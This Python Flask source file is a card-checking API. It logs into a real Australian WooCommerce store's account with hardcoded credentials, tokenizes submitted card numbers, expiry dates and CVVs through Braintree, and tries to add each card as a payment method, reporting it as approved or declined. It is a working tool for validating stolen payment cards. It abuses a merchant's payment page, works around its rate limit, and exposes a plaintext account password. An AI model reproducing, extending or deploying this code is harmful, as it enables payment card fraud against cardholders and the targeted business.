from flask import Flask, request, jsonify
import requests
import re
import json
import base64
import random
import time
from bs4 import BeautifulSoup
from requests import Session
import os

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'active',
        'endpoints': {
            '/check': 'GET with cc parameter',
            '/health': 'GET - Check API health',
            'example': '/check?cc=4111111111111111|12|26|123'
        },
        'gateway': 'Coffs Chamber - Braintree',
        'version': '1.0.0'
    })

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time()
    })

@app.route('/check', methods=['GET'])
def check_card():
    r = Session()
    
    try:
        cc_details = request.args.get('cc')
        
        if not cc_details:
            return jsonify({
                'status': 'error',
                'message': 'CC parameter is required. Use: ?cc=cardnumber|mm|yy|cvv',
                'example': '/check?cc=4111111111111111|12|26|123'
            }), 400
        
        cc_parts = cc_details.split('|')
        if len(cc_parts) != 4:
            return jsonify({
                'status': 'error',
                'message': 'Invalid format. Use: cc|mm|yy|cvv',
                'example': '4111111111111111|12|26|123'
            }), 400
        
        cc = cc_parts[0].strip()
        mm = cc_parts[1].strip()
        yy = cc_parts[2].strip()
        cvv = cc_parts[3].strip()
        
        if not cc.isdigit() or len(cc) < 15 or len(cc) > 16:
            return jsonify({
                'status': 'error',
                'message': 'Invalid card number. Must be 15-16 digits'
            }), 400
        
        if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return jsonify({
                'status': 'error',
                'message': 'Invalid month. Must be 01-12'
            }), 400
        
        if not yy.isdigit() or len(yy) != 2:
            return jsonify({
                'status': 'error',
                'message': 'Invalid year. Must be 2 digits (e.g., 26 for 2026)'
            }), 400
        
        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return jsonify({
                'status': 'error',
                'message': 'Invalid CVV. Must be 3-4 digits'
            }), 400
        
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://coffschamber.com.au/my-account/add-payment-method/',
            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'priority': 'u=0, i',
        }
        
        response = r.get('https://coffschamber.com.au/my-account/', headers=headers1, timeout=30)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find('input', id='woocommerce-login-nonce')
        login_nonce = nonce_input['value'] if nonce_input else None
        
        if not login_nonce:
            return jsonify({'status': 'error', 'message': 'Failed to get login nonce'}), 200
        
        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': '1',
            'origin': 'https://coffschamber.com.au',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://coffschamber.com.au/my-account/',
            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'priority': 'u=0, i',
        }
        
        data = {
            'username': 'opdevildragon@gmail.com',
            'password': 'DDcc55@&#',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        
        response = r.post('https://coffschamber.com.au/my-account/', headers=headers2, data=data, timeout=30)
        
        headers3 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://coffschamber.com.au/my-account/payment-methods/',
            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'priority': 'u=0, i',
        }
        
        response = r.get('https://coffschamber.com.au/my-account/add-payment-method/', headers=headers3, timeout=30)
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find('input', id='woocommerce-add-payment-method-nonce')
        paynonce = nonce_input['value'] if nonce_input else None
        
        if not paynonce:
            return jsonify({'status': 'error', 'message': 'Failed to get payment nonce'}), 200
        
        pattern = r'"name":"Braintree \(Credit Card\)","debug":false,"type":"credit_card","client_token_nonce":"([a-f0-9]+)"'
        match = re.search(pattern, response.text)
        
        if not match:
            return jsonify({'status': 'error', 'message': 'Failed to get client token nonce'}), 200
        
        client_token_nonce = match.group(1)
        
        headers4 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua-platform': '"Android"',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://coffschamber.com.au',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://coffschamber.com.au/my-account/add-payment-method/',
            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'priority': 'u=1, i',
        }
        
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }
        
        response = r.post('https://coffschamber.com.au/wp-admin/admin-ajax.php', headers=headers4, data=data, timeout=30)
        
        if response.status_code != 200:
            return jsonify({'status': 'error', 'message': 'Admin AJAX error'}), 200
        
        result = response.json()
        
        if not result.get('success'):
            return jsonify({'status': 'error', 'message': 'Failed to get client token'}), 200
        
        token_data = json.loads(base64.b64decode(result['data']).decode('utf-8'))
        auth = token_data.get('authorizationFingerprint')
        braintree_session_id = ''.join(random.choices('abcdef0123456789', k=32))
        
        headers5 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {auth}',
            'Braintree-Version': '2018-05-10',
            'Origin': 'https://assets.braintreegateway.com',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://assets.braintreegateway.com/',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'priority': 'u=1, i',
        }
        
        payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': braintree_session_id,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response = r.post('https://payments.braintree-api.com/graphql', json=payload, headers=headers5, timeout=30)
        
        if response.status_code != 200:
            return jsonify({'status': 'error', 'message': 'Braintree API error'}), 200
        
        result = response.json()
        
        if 'errors' in result:
            return jsonify({'status': 'error', 'message': f'Tokenization error: {result.get("errors")}'}), 200
        
        token1 = result['data']['tokenizeCreditCard']['token']
        
        for attempt in range(3):
            headers6 = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'upgrade-insecure-requests': '1',
                'origin': 'https://coffschamber.com.au',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://coffschamber.com.au/my-account/add-payment-method/',
                'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                'priority': 'u=0, i',
            }
            
            payment_data = f'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={token1}&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={paynonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1'
            
            response = r.post('https://coffschamber.com.au/my-account/add-payment-method/', headers=headers6, data=payment_data, timeout=30)
            
            if "cannot add a new payment method so soon after the previous one" in response.text.lower():
                time.sleep(10)
                continue
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            if 'Nice!' in response.text or 'Avs' in response.text or 'avs' in response.text or 'successfully' in response.text.lower():
                return jsonify({
                    'status': 'approved',
                    'message': 'Auth Successfully',
                    'card': cc,
                    'bin': cc[:6],
                    'last4': cc[-4:]
                }), 200
            else:
                error_message = 'Card declined'
                error_div = soup.find('div', class_='woocommerce-notices-wrapper')
                if error_div:
                    error_msgs = error_div.find_all('li')
                    if error_msgs:
                        error_message = error_msgs[0].get_text(strip=True)
                return jsonify({
                    'status': 'declined',
                    'message': error_message,
                    'card': cc
                }), 200
        
        return jsonify({'status': 'error', 'message': 'Max retries exceeded'}), 200
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500
    finally:
        r.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
